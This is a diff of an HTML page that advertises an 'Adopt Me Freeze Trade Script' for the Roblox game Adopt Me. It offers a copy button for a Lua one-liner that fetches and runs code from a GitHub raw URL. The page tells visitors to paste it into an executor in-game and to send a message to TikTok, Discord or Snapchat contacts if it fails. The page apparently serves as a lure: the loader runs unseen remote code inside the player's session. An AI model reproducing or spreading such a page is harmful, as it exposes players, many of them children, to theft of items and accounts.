@@ -1,25 +1,23 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adopt Me Freeze Trade Script</title>
-    <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&display=swap" rel="stylesheet">
-</head>
 <body>
     <div class="container">
-        <h1>Adopt Me Freeze Trade Script</h1>
-        <textarea readonly id="scriptBox">loadstring(game:HttpGet("https://raw.githubusercontent.com/jaxcodesx/jaxscriptadoptme/main/amscript", true))()</textarea>
-        <button id="copyBtn">📜 COPY SCRIPT</button>
-        <p class="note">Note: Works both on phone and PC executors. Go in-game and paste in executor and run it and wait. If it doesn’t work DM @kayplays.adoptme on TikTok.</p>
+        <h1>ADOPT ME FREEZE SCRIPT</h1>
+        <textarea id="scriptBox" readonly>loadstring(game:HttpGet("https://raw.githubusercontent.com/jaxcodesx/jaxscriptadoptme/main/amscript", true))()</textarea>
+        <button id="copyButton" onclick="copyScript()">
+            <span class="icon">📄</span> COPY SCRIPT
+        </button>
+        <p class="note">
+            NOTE: WORKS BOTH ON PHONE AND PC EXECUTORS. GO IN-GAME AND PASTE IN EXECUTOR THEN EXECUTE.
+            IF IT DOESN’T WORK, TRY AGAIN OR DM BELOW.
+        </p>
         
-        <!-- Snapchat Section -->
+        <!-- Added Discord Contact Above Snapchat -->
+        <div class="social">
+            <p>💬 Discord: <span id="discord-username">YourDiscordUsername</span></p>
+        </div>
+        
         <div class="snapchat">
-            <img src="snapchat.png" alt="Snapchat Logo">
-            <span>YourUsernameHere</span>
+            <p>📸 Snapchat: <span id="snapchat-username">your_snapchat</span></p>
         </div>
     </div>
-    <script src="script.js"></script>
 </body>
 </html>
